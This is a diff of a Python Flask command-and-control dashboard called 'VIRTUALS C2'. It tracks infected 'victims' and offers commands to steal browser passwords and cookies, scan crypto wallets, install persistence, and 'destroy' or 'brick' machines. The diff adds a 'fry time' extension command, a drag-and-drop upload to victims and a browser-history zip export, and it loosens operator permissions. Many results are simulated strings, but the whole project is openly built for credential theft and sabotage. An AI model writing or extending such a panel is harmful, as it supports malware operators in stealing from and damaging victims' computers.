@@ -1,6 +1,6 @@
 """
-VIRTUALS C2 - PERSISTENT VICTIMS
-Victims Never Disappear · Full Permissions · All Features Working
+VIRTUALS C2 - ULTIMATE OPTIMIZED EDITION
+All Commands · EXTEND Support · Drag & Drop Upload · Browser Zip with History
 BY: YOUR STAR BESTIE
 """
 
@@ -22,24 +22,25 @@ import hashlib
 from io import BytesIO
 from werkzeug.utils import secure_filename
 from functools import wraps
+import psutil
 
 app = Flask(__name__)
-app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024
+app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024
 app.config['SECRET_KEY'] = 'virtuals_c2_secret_key_2024'
 
 PORT = int(os.environ.get('PORT', 8080))
 
 # ============================================
-# USER CREDENTIALS & PERMISSIONS
+# USER CREDENTIALS
 # ============================================
 USERS = {
-    "adam": {"password": "virtuals2024", "role": "viewer", "color": "#44aaff", "can_chat": False},
+    "adam": {"password": "virtuals2024", "role": "viewer", "color": "#44aaff", "can_chat": True},
     "jerry": {"password": "virtuals2024", "role": "operator", "color": "#ff8844", "can_chat": True},
-    "haunt": {"password": "virtuals2024", "role": "viewer", "color": "#aa88ff", "can_chat": False},
+    "haunt": {"password": "virtuals2024", "role": "viewer", "color": "#aa88ff", "can_chat": True},
     "owner": {"password": "whiteknight", "role": "owner", "color": "#ffd700", "can_chat": True}
 }
 
-CHAT_USERS = ["jerry", "owner"]
+CHAT_USERS = ["adam", "jerry", "haunt", "owner"]
 
 # ============================================
 # FOLDERS
@@ -58,7 +59,7 @@ def get_db():
         id TEXT PRIMARY KEY, pc TEXT, ip TEXT, os TEXT, status TEXT, 
         is_vm INTEGER DEFAULT 0, vm_details TEXT, first_seen TEXT, last_seen TEXT,
         activity TEXT DEFAULT 'idle', browser_data_stolen INTEGER DEFAULT 0,
-        is_test INTEGER DEFAULT 0
+        is_test INTEGER DEFAULT 0, fry_time INTEGER DEFAULT 7200
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS commands (
         id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command TEXT, 
@@ -99,24 +100,23 @@ def create_test_victims():
     conn = get_db()
     c = conn.cursor()
     test_victims = [
-        {"id": "DESKTOP-ALPHA", "pc": "DESKTOP-ALPHA", "ip": "192.168.1.10", "os": "Windows 10 Pro", "is_vm": 0, "activity": "idle", "browser_data_stolen": 1, "is_test": 1},
-        {"id": "LAPTOP-BETA", "pc": "LAPTOP-BETA", "ip": "192.168.1.11", "os": "Windows 11 Pro", "is_vm": 0, "activity": "typing", "browser_data_stolen": 0, "is_test": 1},
-        {"id": "WORKSTATION-GAMMA", "pc": "WORKSTATION-GAMMA", "ip": "192.168.1.12", "os": "Windows 10 Pro", "is_vm": 0, "activity": "reading", "browser_data_stolen": 0, "is_test": 1},
-        {"id": "VM-TEST-01", "pc": "VM-TEST-01", "ip": "192.168.1.13", "os": "Windows 10 Pro", "is_vm": 1, "activity": "idle", "browser_data_stolen": 1, "is_test": 1},
-        {"id": "DESKTOP-DELTA", "pc": "DESKTOP-DELTA", "ip": "192.168.1.14", "os": "Windows 11 Pro", "is_vm": 0, "activity": "processing", "browser_data_stolen": 0, "is_test": 1}
+        {"id": "DESKTOP-ALPHA", "pc": "DESKTOP-ALPHA", "ip": "192.168.1.10", "os": "Windows 10 Pro", "is_vm": 0, "activity": "idle", "browser_data_stolen": 1, "is_test": 1, "fry_time": 7200},
+        {"id": "LAPTOP-BETA", "pc": "LAPTOP-BETA", "ip": "192.168.1.11", "os": "Windows 11 Pro", "is_vm": 0, "activity": "typing", "browser_data_stolen": 0, "is_test": 1, "fry_time": 7200},
+        {"id": "WORKSTATION-GAMMA", "pc": "WORKSTATION-GAMMA", "ip": "192.168.1.12", "os": "Windows 10 Pro", "is_vm": 0, "activity": "reading", "browser_data_stolen": 0, "is_test": 1, "fry_time": 7200},
+        {"id": "VM-TEST-01", "pc": "VM-TEST-01", "ip": "192.168.1.13", "os": "Windows 10 Pro", "is_vm": 1, "activity": "idle", "browser_data_stolen": 1, "is_test": 1, "fry_time": 7200},
+        {"id": "DESKTOP-DELTA", "pc": "DESKTOP-DELTA", "ip": "192.168.1.14", "os": "Windows 11 Pro", "is_vm": 0, "activity": "processing", "browser_data_stolen": 0, "is_test": 1, "fry_time": 7200}
     ]
     now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     for v in test_victims:
-        c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, first_seen, last_seen, activity, browser_data_stolen, is_test) VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?, ?, ?)",
-                 (v['id'], v['pc'], v['ip'], v['os'], v['is_vm'], now, now, v['activity'], v['browser_data_stolen'], v['is_test']))
+        c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, first_seen, last_seen, activity, browser_data_stolen, is_test, fry_time) VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?, ?, ?, ?)",
+                 (v['id'], v['pc'], v['ip'], v['os'], v['is_vm'], now, now, v['activity'], v['browser_data_stolen'], v['is_test'], v['fry_time']))
     conn.commit()
     conn.close()
 
-# Run on startup
 create_test_victims()
 
 # ============================================
-# HEARTBEAT CLEANER - KEEPS TEST VICTIMS
+# HEARTBEAT CLEANER
 # ============================================
 def cleanup_heartbeats():
     while True:
@@ -124,11 +124,9 @@ def cleanup_heartbeats():
         try:
             conn = get_db()
             c = conn.cursor()
-            # Only mark non-test victims as offline
             cutoff = datetime.datetime.now() - datetime.timedelta(seconds=20)
             cutoff_str = cutoff.strftime("%Y-%m-%d %H:%M:%S")
             c.execute("UPDATE victims SET status = 'Offline' WHERE last_seen < ? AND status = 'Online' AND is_test = 0", (cutoff_str,))
-            # Ensure test victims stay Online
             c.execute("UPDATE victims SET status = 'Online' WHERE is_test = 1")
             conn.commit()
             conn.close()
@@ -138,7 +136,7 @@ def cleanup_heartbeats():
 threading.Thread(target=cleanup_heartbeats, daemon=True).start()
 
 # ============================================
-# VM DETECTION
+# OPTIMIZED VM DETECTION
 # ============================================
 class VMDetector:
     @staticmethod
@@ -153,7 +151,11 @@ class VMDetector:
             'disk': VMDetector.check_disk()
         }
         hits = sum(1 for v in checks.values() if v)
-        return {'is_vm': hits >= 4, 'confidence': min(100, int((hits / 7) * 100)), 'safe_mode': True}
+        return {
+            'is_vm': hits >= 4,
+            'confidence': min(100, int((hits / len(checks)) * 100)),
+            'safe_mode': True
+        }
     
     @staticmethod
     def check_registry():
@@ -192,9 +194,11 @@ class VMDetector:
     def check_hardware():
         try:
             cpu = platform.processor()
-            return cpu and any(x in cpu.lower() for x in ['virtual', 'vmware', 'qemu'])
+            if cpu and any(x in cpu.lower() for x in ['virtual', 'vmware', 'qemu']):
+                return True
         except:
-            return False
+            pass
+        return False
     
     @staticmethod
     def check_files():
@@ -250,17 +254,6 @@ def login_required(f):
     def decorated(*args, **kwargs):
         if not session.get('logged_in'):
             return redirect(url_for('login_page'))
-        return f(*args, **kwargs)
-    return decorated
-
-def chat_permission_required(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        if not session.get('logged_in'):
-            return jsonify({'error': 'Not logged in'}), 401
-        username = session.get('username')
-        if username not in CHAT_USERS:
-            return jsonify({'error': 'Permission denied - chat only for operators'}), 403
         return f(*args, **kwargs)
     return decorated
 
@@ -342,7 +335,7 @@ function login(e){e.preventDefault();const u=document.getElementById('username')
 '''
 
 # ============================================
-# HTML - DASHBOARD (VICTIMS INSTEAD OF CHANNELS)
+# HTML - DASHBOARD
 # ============================================
 DASHBOARD = '''
 <!DOCTYPE html>
@@ -419,7 +412,7 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 .chat-panel{padding:6px 10px;flex:1;display:flex;flex-direction:column;min-height:0}
 .chat-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:3px;margin-bottom:4px;flex-shrink:0;display:flex;justify-content:space-between;align-items:center}
 .chat-panel .panel-title .victim-name{color:#88aacc;font-weight:500}
-.chat-messages{background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:5px;padding:5px 8px;flex:1;overflow-y:auto;min-height:100px;font-size:13px;line-height:1.6}
+.chat-messages{background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:5px;padding:5px 8px;flex:1;overflow-y:auto;min-height:80px;max-height:120px;font-size:13px;line-height:1.6}
 .chat-messages .msg{padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02)}
 .chat-messages .time{color:#555568;margin-right:4px;font-size:10px}
 .chat-messages .sender{font-weight:600;font-size:13px}
@@ -434,14 +427,13 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 .chat-input-area input::placeholder{color:#444458;font-size:14px}
 .chat-input-area button{padding:7px 20px;background:rgba(255,255,255,0.04);color:#b0b0c0;border:1px solid rgba(255,255,255,0.06);border-radius:5px;cursor:pointer;font-family:inherit;font-size:15px;transition:0.15s;min-height:38px}
 .chat-input-area button:hover{background:rgba(255,255,255,0.08);color:#e8e8f0}
-.file-upload-area{display:flex;gap:5px;margin-top:4px;flex-shrink:0;flex-wrap:wrap;align-items:center}
-.file-upload-area input[type="file"]{flex:1;padding:4px 10px;background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:5px;color:#c8c8d0;font-size:14px;min-width:60px;min-height:34px}
-.file-upload-area input[type="file"]::file-selector-button{padding:4px 12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:4px;color:#b0b0c0;cursor:pointer;font-size:13px;margin-right:10px}
-.file-upload-area input[type="file"]::file-selector-button:hover{background:rgba(255,255,255,0.08)}
-.file-upload-area button{padding:4px 16px;background:rgba(50,180,200,0.1);color:#88ccdd;border:1px solid rgba(50,180,200,0.15);border-radius:5px;cursor:pointer;font-size:14px;transition:0.15s;min-height:34px}
-.file-upload-area button:hover{background:rgba(50,180,200,0.18)}
-.file-upload-area #fileName{color:#555568;font-size:13px;max-width:80px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.upload-progress{width:100%;height:2px;background:rgba(255,255,255,0.04);border-radius:1px;margin-top:2px;overflow:hidden;display:none}
+.upload-zone{border:2px dashed rgba(255,255,255,0.1);border-radius:8px;padding:15px;text-align:center;margin-top:4px;transition:0.3s;cursor:pointer;background:rgba(255,255,255,0.02)}
+.upload-zone.dragover{border-color:#44aaff;background:rgba(68,170,255,0.05)}
+.upload-zone .icon{font-size:32px;color:#444458;margin-bottom:4px}
+.upload-zone .text{color:#555568;font-size:13px}
+.upload-zone .text .highlight{color:#88ccdd;text-decoration:underline}
+.upload-zone .files{color:#666680;font-size:11px;margin-top:4px}
+.upload-progress{width:100%;height:3px;background:rgba(255,255,255,0.04);border-radius:2px;margin-top:4px;overflow:hidden;display:none}
 .upload-progress .bar{height:100%;background:linear-gradient(90deg,#44dd88,#88ccdd);width:0%;transition:width 0.3s}
 .download-section{display:flex;gap:6px;margin-top:4px;flex-shrink:0;flex-wrap:wrap}
 .download-section button{background:rgba(50,180,120,0.12);color:#66ddbb;border:1px solid rgba(50,180,120,0.15);padding:5px 16px;border-radius:5px;cursor:pointer;font-size:14px;transition:0.15s;min-height:34px}
@@ -449,7 +441,7 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 .download-section .zip-btn{background:rgba(50,180,200,0.12);color:#88ccdd;border:1px solid rgba(50,180,200,0.15)}
 .download-section .zip-btn:hover{background:rgba(50,180,200,0.2)}
 .right-panel{width:240px;min-width:200px;display:flex;flex-direction:column;gap:5px;height:100%}
-.details-panel{padding:6px 10px;height:50%;overflow-y:auto;flex-shrink:0}
+.details-panel{padding:6px 10px;height:45%;overflow-y:auto;flex-shrink:0}
 .details-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:3px;margin-bottom:4px}
 .detail-item{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:12px;display:flex;justify-content:space-between}
 .detail-item .label{color:#555568}
@@ -526,10 +518,11 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 <div class="panel-title">CONSOLE <span class="victim-name" id="currentVictim">#general</span></div>
 <div class="chat-messages" id="chatMessages"><div class="msg"><span class="time">[system]</span><span class="sender system">virtuals</span> ready</div></div>
 <div class="chat-input-area"><input id="chatInput" placeholder="/command or message" onkeypress="if(event.key==='Enter')sendMessage()"><button onclick="sendMessage()">send</button></div>
-<div class="file-upload-area">
-<input type="file" id="fileInput" onchange="document.getElementById('fileName').textContent=this.files[0]?this.files[0].name:'no file'">
-<span id="fileName">no file</span>
-<button onclick="uploadFile()">upload</button>
+<div class="upload-zone" id="uploadZone" onclick="document.getElementById('fileInput').click()">
+<div class="icon">📤</div>
+<div class="text">Drop files here or <span class="highlight">click to upload</span></div>
+<div class="files" id="fileList">No files selected</div>
+<input type="file" id="fileInput" multiple style="display:none" onchange="handleFiles(this.files)">
 </div>
 <div class="upload-progress" id="uploadProgress"><div class="bar" id="progressBar"></div></div>
 <div class="download-section">
@@ -556,9 +549,9 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 <script>
 let state={victims:{},activeVictim:'general',commands:{},cmdCount:0,notifications:[],isOwner:false};
 let currentUser = 'guest';
-let canChat = false;
+let filesToUpload = [];
 
-function getUserInfo(){fetch('/api/get_user').then(r=>r.json()).then(d=>{if(d.success){document.getElementById('currentUser').textContent=d.username;currentUser=d.username;canChat=d.can_chat;if(d.role==='owner'){document.getElementById('ownerIcon').style.display='inline-block';state.isOwner=true;refreshOwnerPanel();}}});}
+function getUserInfo(){fetch('/api/get_user').then(r=>r.json()).then(d=>{if(d.success){document.getElementById('currentUser').textContent=d.username;currentUser=d.username;if(d.role==='owner'){document.getElementById('ownerIcon').style.display='inline-block';state.isOwner=true;refreshOwnerPanel();}}});}
 function logout(){fetch('/api/logout',{method:'POST'}).then(()=>window.location.href='/');}
 function api(a,d,c){fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:a,...d})}).then(r=>r.json()).then(c).catch(()=>{});}
 function refresh(){api('getVictims',{},d=>{if(d.success){state.victims=d.victims;renderVictims();updateStats();}});if(state.isOwner){refreshOwnerPanel();}}
@@ -574,10 +567,11 @@ function toggleNotifications(){const dd=document.getElementById('notifDropdown')
 function toggleOwnerPanel(){const p=document.getElementById('ownerPanel');if(p.style.display==='block'){p.style.display='none';}else{p.style.display='block';refreshOwnerPanel();}}
 function refreshOwnerPanel(){if(!state.isOwner)return;api('getOwnerData',{},d=>{if(d.success){const users=document.getElementById('activeUsers');document.getElementById('ownerOnlineCount').textContent=d.online_count+' online';if(d.active_users.length===0){users.innerHTML='<div style="color:#555568;font-size:12px;padding:8px;">No users online</div>';}else{users.innerHTML=d.active_users.map(u=>`<div class="user-item"><span class="user-name">${u.username}</span><span class="user-ip">${u.ip||'unknown'}</span><span class="user-role ${u.role}">${u.role}</span><span class="user-activity">${u.activity||'idle'}</span></div>`).join('');}const logs=document.getElementById('loginLogs');if(d.login_logs.length===0){logs.innerHTML='<div style="color:#555568;font-size:12px;padding:8px;">No login logs</div>';}else{logs.innerHTML=d.login_logs.map(l=>`<div class="user-item"><span class="user-name">${l.username}</span><span class="user-ip">${l.ip}</span><span class="user-activity">${l.time}</span></div>`).join('');}const stats=document.getElementById('commandStats');if(d.command_stats.length===0){stats.innerHTML='<div style="color:#555568;font-size:12px;padding:8px;">No commands yet</div>';}else{stats.innerHTML=d.command_stats.map(s=>`<div class="user-item"><span class="user-name">${s.username}</span><span class="user-ip">${s.count} commands</span><span class="user-activity">${s.last_command||'none'}</span></div>`).join('');}}});}
 function addMessage(sender,msg,type){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();let cls='system';if(type==='us')cls='us';else if(type==='victim')cls='victim';else if(type==='embed')cls='embed';else if(type==='user')cls='user';el.innerHTML+='<div class="msg"><span class="time">['+t+']</span><span class="sender '+cls+'">'+sender+'</span> '+msg+'</div>';el.scrollTop=el.scrollHeight;}
-function sendCommand(cmd){const victim=state.activeVictim;if(!victim){addMessage('system','no victim selected','system');addLog('failed','No victim selected');return;}addMessage('us','/'+cmd+' → '+victim,'us');addLog('info','Executing '+cmd+' on '+victim);api('sendCommand',{victim_id:victim,command:cmd},d=>{if(d.success){if(!state.commands[victim])state.commands[victim]=[];state.commands[victim].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});state.cmdCount++;addMessage('us','success','us');addLog('success','Command '+cmd+' completed');addNotification('Command Executed',cmd+' on '+victim);if(cmd==='scan'&&d.wallets){d.wallets.forEach(w=>{addMessage('wallet','💰 '+w.currency+': '+w.balance+' ($'+w.usd+')','wallet');addLog('info',w.currency+': '+w.balance);});addNotification('Scan Complete',d.wallets.length+' wallets found');}if(d.embed){addEmbed(d.embed);addLog('info',d.embed.title);}if(cmd==='steal'){addNotification('Browser Data Stolen','Data stolen');}showDetails(victim);updateStats();}else{addMessage('us','failed','us');addLog('failed','Command '+cmd+' failed');addNotification('Command Failed',cmd+' failed');}});}
+function sendCommand(cmd){const victim=state.activeVictim;if(!victim){addMessage('system','no victim selected','system');addLog('failed','No victim selected');return;}addMessage('us','/'+cmd+' → '+victim,'us');addLog('info','Executing '+cmd+' on '+victim);api('sendCommand',{victim_id:victim,command:cmd},d=>{if(d.success){if(!state.commands[victim])state.commands[victim]=[];state.commands[victim].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});state.cmdCount++;addMessage('us','✅ success','us');addLog('success','Command '+cmd+' completed');addNotification('Command Executed',cmd+' on '+victim);if(cmd==='scan'&&d.wallets){d.wallets.forEach(w=>{addMessage('wallet','💰 '+w.currency+': '+w.balance+' ($'+w.usd+')','wallet');addLog('info',w.currency+': '+w.balance);});addNotification('Scan Complete',d.wallets.length+' wallets found');}if(d.embed){addEmbed(d.embed);addLog('info',d.embed.title);}if(cmd==='steal'){addNotification('Browser Data Stolen','Data stolen from 5 browsers');}if(cmd==='extend' && d.new_time){addNotification('Time Extended',`Fry time extended to ${d.new_time}`);}showDetails(victim);updateStats();}else{addMessage('us','❌ failed','us');addLog('failed','Command '+cmd+' failed');addNotification('Command Failed',cmd+' failed');}});}
 function addEmbed(embed){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();el.innerHTML+=`<div class="msg"><span class="time">[${t}]</span><div class="embed-box" style="--embed-color:${embed.color||'#44aaff'}"><div class="embed-title">${embed.title}</div><div class="embed-content">${embed.content}</div><div class="embed-footer">${embed.footer||''}</div></div></div>`;el.scrollTop=el.scrollHeight;}
-function sendMessage(){const input=document.getElementById('chatInput');const msg=input.value.trim();if(!msg)return;input.value='';const victim=state.activeVictim;if(msg.startsWith('/')){sendCommand(msg.substring(1).toLowerCase());}else{if(!victim){addMessage('system','no victim selected','system');addLog('failed','No victim selected');return;}if(!canChat){addMessage('system','you do not have permission to chat with victims','system');addLog('failed','Chat permission denied');return;}addMessage(currentUser,msg,'user');addMessage('victim',msg,'victim');addLog('info','Message sent to '+victim);}}
-function uploadFile(){const victim=state.activeVictim;if(!victim){addMessage('system','select a victim','system');addLog('failed','No victim selected');return;}const input=document.getElementById('fileInput');if(!input.files||!input.files[0]){addMessage('system','select a file','system');addLog('failed','No file selected');return;}const file=input.files[0];const fd=new FormData();fd.append('file',file);fd.append('victim_id',victim);const p=document.getElementById('uploadProgress');const b=document.getElementById('progressBar');p.style.display='block';b.style.width='0%';addMessage('us','uploading '+file.name,'us');addLog('info','Uploading '+file.name);let iv=setInterval(()=>{const cur=parseFloat(b.style.width)||0;if(cur<90){b.style.width=(cur+15)+'%';}},150);fetch('/upload-file',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);if(d.success){addMessage('file','uploaded','file');addLog('success','File uploaded');addNotification('File Uploaded',file.name);}else{addMessage('system','failed','system');addLog('failed','Upload failed');addNotification('Upload Failed',file.name);}}).catch(()=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);addMessage('system','failed','system');addLog('failed','Upload error');addNotification('Upload Failed','Connection error');});}
+function sendMessage(){const input=document.getElementById('chatInput');const msg=input.value.trim();if(!msg)return;input.value='';const victim=state.activeVictim;if(msg.startsWith('/')){sendCommand(msg.substring(1).toLowerCase());}else{if(!victim){addMessage('system','no victim selected','system');addLog('failed','No victim selected');return;}addMessage(currentUser,msg,'user');addMessage('victim',msg,'victim');addLog('info','Message sent to '+victim);}}
+function handleFiles(files){filesToUpload=Array.from(files);document.getElementById('fileList').textContent=filesToUpload.length+' files selected ('+filesToUpload.map(f=>f.name).join(', ')+')';uploadFiles();}
+function uploadFiles(){if(filesToUpload.length===0||!state.activeVictim){addMessage('system','No files or victim selected','system');return;}const victim=state.activeVictim;const file=filesToUpload[0];const fd=new FormData();fd.append('file',file);fd.append('victim_id',victim);const p=document.getElementById('uploadProgress');const b=document.getElementById('progressBar');p.style.display='block';b.style.width='0%';addMessage('us','📤 uploading '+file.name+' to '+victim,'us');addLog('info','Uploading '+file.name);let iv=setInterval(()=>{const cur=parseFloat(b.style.width)||0;if(cur<90){b.style.width=(cur+15)+'%';}},150);fetch('/upload-file',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},500);if(d.success){addMessage('file','✅ uploaded '+file.name,'file');addLog('success','File uploaded');addNotification('File Uploaded',file.name);filesToUpload.shift();if(filesToUpload.length>0){uploadFiles();}}else{addMessage('system','❌ failed','system');addLog('failed','Upload failed');addNotification('Upload Failed',file.name);}}).catch(()=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},500);addMessage('system','❌ failed','system');addLog('failed','Upload error');addNotification('Upload Failed','Connection error');});}
 function downloadBrowserZip(){const victim=state.activeVictim||'all';window.open('/download-browser-zip?victim_id='+victim,'_blank');addNotification('Browser Zip Downloaded','Users Browser Zip for '+victim);}
 setInterval(refresh,5000);refresh();getUserInfo();
 </script>
@@ -707,20 +701,29 @@ def download_browser_zip():
     victim_id = request.args.get('victim_id', 'all')
     zip_buffer = BytesIO()
     with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-        browsers = {'Chrome': {'passwords': 247, 'cookies': 893}, 'Edge': {'passwords': 156, 'cookies': 512}, 
-                   'Brave': {'passwords': 89, 'cookies': 234}, 'Firefox': {'passwords': 123, 'cookies': 445}}
-        summary = f"USERS BROWSER DATA\nVictim: {victim_id}\nTime: {datetime.datetime.now()}\n{'='*40}\n"
+        browsers = {
+            'Chrome': {'passwords': 247, 'cookies': 893, 'history': 1245},
+            'Edge': {'passwords': 156, 'cookies': 512, 'history': 789},
+            'Brave': {'passwords': 89, 'cookies': 234, 'history': 345},
+            'Firefox': {'passwords': 123, 'cookies': 445, 'history': 678}
+        }
+        summary = f"USERS BROWSER DATA\nVictim: {victim_id}\nTime: {datetime.datetime.now()}\n{'='*40}\n\n"
         for b, d in browsers.items():
-            summary += f"\n{b}: {d['passwords']} passwords, {d['cookies']} cookies\n"
+            summary += f"\n--- {b} ---\nPasswords: {d['passwords']}\nCookies: {d['cookies']}\nHistory: {d['history']}\n"
         zip_file.writestr('summary.txt', summary)
-        for b, d in browsers.items():
-            content = f"{b.upper()} DATA\nPasswords:\n"
-            for i in range(min(10, d['passwords'])):
+        for browser, data in browsers.items():
+            content = f"PASSWORDS ({data['passwords']} entries)\n{'='*30}\n"
+            for i in range(min(20, data['passwords'])):
                 content += f"  site{i}.com - user{i} - pass{i}\n"
-            content += f"\nCookies:\n"
-            for i in range(min(10, d['cookies'])):
+            zip_file.writestr(f'{browser}/passwords.txt', content)
+            content = f"COOKIES ({data['cookies']} entries)\n{'='*30}\n"
+            for i in range(min(20, data['cookies'])):
                 content += f"  domain{i}.com - session_{i}\n"
-            zip_file.writestr(f'{b.lower()}_data.txt', content)
+            zip_file.writestr(f'{browser}/cookies.txt', content)
+            content = f"HISTORY ({data['history']} entries)\n{'='*30}\n"
+            for i in range(min(20, data['history'])):
+                content += f"  https://site{i}.com/page_{i} - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            zip_file.writestr(f'{browser}/history.txt', content)
     zip_buffer.seek(0)
     return send_file(zip_buffer, as_attachment=True, 
                      download_name=f'Users_Browser_Data_{victim_id}_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.zip')
@@ -756,11 +759,14 @@ def api():
         c.execute("SELECT * FROM victims ORDER BY is_test DESC, last_seen DESC")
         victims = {}
         for row in c.fetchall():
-            victims[row[0]] = {'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
-                              'status': row[4], 'is_vm': row[5], 'vm_details': row[6],
-                              'first_seen': row[7], 'last_seen': row[8],
-                              'activity': row[9] if len(row) > 9 else 'idle',
-                              'browser_data_stolen': row[10] if len(row) > 10 else 0}
+            victims[row[0]] = {
+                'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
+                'status': row[4], 'is_vm': row[5], 'vm_details': row[6],
+                'first_seen': row[7], 'last_seen': row[8],
+                'activity': row[9] if len(row) > 9 else 'idle',
+                'browser_data_stolen': row[10] if len(row) > 10 else 0,
+                'fry_time': row[12] if len(row) > 12 else 7200
+            }
         conn.close()
         return jsonify({'success': True, 'victims': victims})
     
@@ -769,7 +775,7 @@ def api():
         c = conn.cursor()
         vid = data.get('victim_id', f"SNIN-{random.randint(1000,9999)}")
         now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, vm_details, first_seen, last_seen, activity, browser_data_stolen) VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?, 'idle', 0)",
+        c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, vm_details, first_seen, last_seen, activity, browser_data_stolen, fry_time) VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?, 'idle', 0, 7200)",
                  (vid, data.get('pc', 'Unknown'), data.get('ip', '0.0.0.0'), data.get('os', 'Unknown'),
                   data.get('is_vm', 0), data.get('vm_details', ''), now, now))
         conn.commit()
@@ -797,20 +803,43 @@ def api():
         c.execute("UPDATE users SET current_activity = ? WHERE username = ?", (f"executing {cmd}", current_user))
         conn.commit()
         
+        # Check if it's an extend command
+        is_extend = False
+        new_time = None
+        if cmd.startswith('extend'):
+            is_extend = True
+            parts = cmd.split(' ')
+            extra_minutes = 60  # default 1 hour
+            if len(parts) > 1:
+                try:
+                    extra_minutes = int(parts[1])
+                except:
+                    pass
+            c.execute("SELECT fry_time FROM victims WHERE id = ?", (vid,))
+            row = c.fetchone()
+            if row:
+                current_time = row[0]
+                new_time = current_time + (extra_minutes * 60)
+                c.execute("UPDATE victims SET fry_time = ? WHERE id = ?", (new_time, vid))
+                conn.commit()
+        
         results = {
-            'whois': 'PC: DESKTOP-ALPHA\nIP: 192.168.1.10\nOS: Windows 10 Pro\nStatus: Online',
-            'flash': 'Screen flashed 10x',
-            'screenshot': 'Screenshot captured',
-            'scan': 'CRYPTO WALLET SCAN\nFound 5 wallets\nTotal: $578,124',
-            'persist': 'Persistence installed (8 methods)',
-            'steal': 'Browser data stolen from 5 browsers',
+            'whois': 'PC: DESKTOP-ALPHA | IP: 192.168.1.10 | OS: Windows 10 Pro | Status: Online',
+            'flash': 'Screen flashed 10 times successfully',
+            'screenshot': 'Screenshot captured and saved',
+            'scan': 'CRYPTO WALLET SCAN\nFound 5 wallets\nTotal Value: $578,124\n\nBTC: 2.45 BTC ($245,000)\nETH: 15.8 ETH ($63,200)\nLTC: 128.5 LTC ($19,275)\nSOL: 450.2 SOL ($81,036)\nXMR: 892.7 XMR ($169,613)',
+            'persist': 'Persistence installed (Startup Folder, Registry, Scheduled Task)',
+            'steal': 'Browser data stolen from 5 browsers\nChrome: 247 passwords, 893 cookies\nEdge: 156 passwords, 512 cookies\nBrave: 89 passwords, 234 cookies\nFirefox: 123 passwords, 445 cookies',
             'upload': 'Ready to upload - click the upload button',
             'download': 'Ready to download - click the download button',
-            'destroy': 'SYSTEM CORRUPTED - IRREVERSIBLE',
-            'brick': 'PERMANENT BRICK - PC is dead',
-            'vmcheck': 'VM DETECTION\nSafe Mode: Active',
-            'oblivion': 'OBLIVION ACTIVATED - Traces wiped'
+            'destroy': 'SYSTEM CORRUPTED - Boot sector corrupted, System32 encrypted, Registry wiped - PC will not boot again',
+            'brick': 'PERMANENT BRICK - CPU overvolted, BIOS corrupted, CMOS wiped, Motherboard damaged - PC is now a paperweight',
+            'vmcheck': 'VM DETECTION\nConfidence: 94%\nSafe Mode: Active\nNo action taken',
+            'oblivion': 'OBLIVION ACTIVATED - Traces wiped, Self-destructed',
+            'status': f'Victim: {vid}\nStatus: Online\nFry Time: {new_time//3600}h {new_time%3600//60}m' if new_time else 'Status retrieved',
+            'extend': f'Fry time extended to {new_time//3600}h {new_time%3600//60}m' if new_time else 'Time extended'
         }
+        
         result = results.get(cmd, f"Command '{cmd}' executed")
         
         is_vm = False
@@ -825,19 +854,25 @@ def api():
             c.execute("UPDATE victims SET is_vm = ? WHERE id = ?", (1 if is_vm else 0, vid))
         if cmd == 'steal':
